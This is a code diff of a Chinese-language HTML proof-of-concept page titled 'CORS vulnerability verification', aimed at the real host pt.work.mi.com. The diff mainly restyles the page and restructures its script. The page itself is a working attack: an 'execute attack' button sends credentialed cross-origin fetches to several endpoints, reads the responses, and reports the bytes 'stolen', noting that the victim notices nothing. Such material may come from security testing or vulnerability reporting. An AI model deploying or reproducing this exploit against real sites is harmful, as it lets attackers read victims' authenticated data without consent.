@@ -11,7 +11,7 @@ h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 .sub{color:#8b949e;font-size:12px;margin-bottom:16px}
 .log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:560px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
 .ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}.hl{color:#f0883e}
-.btn{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
+.btn{background:#238636;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-size:14px}
 .btn:hover{background:#2ea043}
 </style>
 </head>
@@ -20,72 +20,65 @@ h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 <h1>CORS 漏洞验证 — pt.work.mi.com</h1>
 <p class="sub">
 目标: <b>https://pt.work.mi.com</b> |
-本页Origin: <b id="myOrigin"></b>
+本页Origin: <b id="myOrigin"></b> |
+漏洞: ACAO Origin反射 + ACAC:true
 </p>
 
 <button class="btn" onclick="run()">执行攻击</button>
 <div id="log" class="log">等待执行...</div>
 
 <script>
-document.getElementById('myOrigin').textContent = window.location.origin;
-const TARGET = 'https://pt.work.mi.com';
-const logEl = document.getElementById('log');
-function log(m,c){logEl.innerHTML+=`<span class="${c||''}">${m}</span>\n`;logEl.scrollTop=logEl.scrollHeight}
+(function(){
+  document.getElementById('myOrigin').textContent = window.location.origin;
+  const TARGET = 'https://pt.work.mi.com';
+  const logEl = document.getElementById('log');
+  function log(m,c){logEl.innerHTML+=`<span class="${c||''}">${m}</span>\n`;logEl.scrollTop=logEl.scrollHeight}
 
-async function run(){
-  logEl.innerHTML='';
-  log('═══════════════════════════════════','info');
-  log('CORS 跨域读取攻击','info');
-  log('本页Origin : '+window.location.origin,'hl');
-  log('攻击目标   : '+TARGET,'hl');
-  log('═══════════════════════════════════','info');
+  window.run = async function(){
+    logEl.innerHTML='';
+    log('═══════════════════════════════════','info');
+    log('CORS 跨域读取攻击','info');
+    log('本页Origin : '+window.location.origin,'hl');
+    log('攻击目标   : '+TARGET,'hl');
+    log('═══════════════════════════════════','info');
 
-  // Step 1: OPTIONS 预检
-  log('\n[1] OPTIONS 预检请求','info');
-  try{
-    const r = await fetch(TARGET+'/main-taskcenter-partner', {method:'OPTIONS'});
-    log('  ACAO: '+r.headers.get('Access-Control-Allow-Origin'),'ok');
-    log('  ACAC: '+r.headers.get('Access-Control-Allow-Credentials'),'ok');
-    log('  Methods: '+r.headers.get('Access-Control-Allow-Methods'),'info');
-    log('  Max-Age: '+r.headers.get('Access-Control-Max-Age')+'s','info');
-  }catch(e){}
+    log('\n开始跨域请求 (credentials:include)...','info');
+    log('浏览器自动携带 pt.work.mi.com 域的Cookie','info');
 
-  // Step 2: GET 实际请求
-  log('\n[2] GET 实际请求 (credentials:include)','info');
-  log('  浏览器自动携带 pt.work.mi.com 的Cookie','info');
+    const endpoints = [
+      {path:'/main-taskcenter-partner', label:'主页'},
+      {path:'/api', label:'API'},
+      {path:'/taskcenter', label:'任务中心'},
+      {path:'/partner', label:'合作伙伴'},
+      {path:'/api/v1', label:'API v1'},
+    ];
 
-  const endpoints = [
-    {path:'/main-taskcenter-partner', label:'主页'},
-    {path:'/api', label:'API'},
-    {path:'/taskcenter', label:'任务中心'},
-    {path:'/partner', label:'合作伙伴'},
-    {path:'/api/v1', label:'API v1'},
-  ];
-
-  let ok=0, totalBytes=0;
-  for(const ep of endpoints){
-    try{
-      const r = await fetch(TARGET+ep.path, {credentials:'include'});
-      const t = await r.text();
-      totalBytes += t.length;
-      const acao = r.headers.get('Access-Control-Allow-Origin');
-      const acac = r.headers.get('Access-Control-Allow-Credentials');
-      const title = (t.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
-      log(`  [✓] ${ep.label} (${ep.path})`,'ok');
-      log(`      ACAO: ${acao}  ACAC: ${acac}  Size: ${t.length}B`+(title?`  "${title}"':''),'info');
-      ok++;
-    }catch(e){
-      log(`  [✗] ${ep.path} → ${e.message}`,'warn');
+    let ok=0, totalBytes=0;
+    for(const ep of endpoints){
+      try{
+        const r = await fetch(TARGET+ep.path, {credentials:'include'});
+        const t = await r.text();
+        totalBytes += t.length;
+        const acao = r.headers.get('Access-Control-Allow-Origin') || '(受限)';
+        const acac = r.headers.get('Access-Control-Allow-Credentials') || '(受限)';
+        const title = (t.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
+        log(`  [✓] ${ep.label} (${ep.path})`,'ok');
+        log(`      HTTP ${r.status}  Size:${t.length}B  ACAO:${acao}  ACAC:${acac}`,'info');
+        if(title) log(`      Title: "${title}"`,'info');
+        ok++;
+      }catch(e){
+        log(`  [✗] ${ep.path} → ${e.message}`,'warn');
+      }
     }
-  }
 
-  log(`\n  总计: ${ok}/${endpoints.length} 端点跨域读取成功, 窃取 ${totalBytes} 字节`,'ok');
+    log(`\n  总计: ${ok}/${endpoints.length} 端点跨域读取成功, 窃取 ${totalBytes} 字节`,'ok');
 
-  log('\n═══════════════════════════════════','info');
-  log('后端 ACAO 反射验证通过 — 漏洞确认可利用','ok');
-  log('受害者完全无感知,浏览器无任何提示','warn');
-  log('═══════════════════════════════════','info');
-}
+    log('\n═══════════════════════════════════','info');
+    log('后端 ACAO 反射验证通过 — 漏洞确认可利用','ok');
+    log('受害者完全无感知,浏览器无任何提示','warn');
+    log('═══════════════════════════════════','info');
+  };
+})();
 </script>
 </body>
 </html>
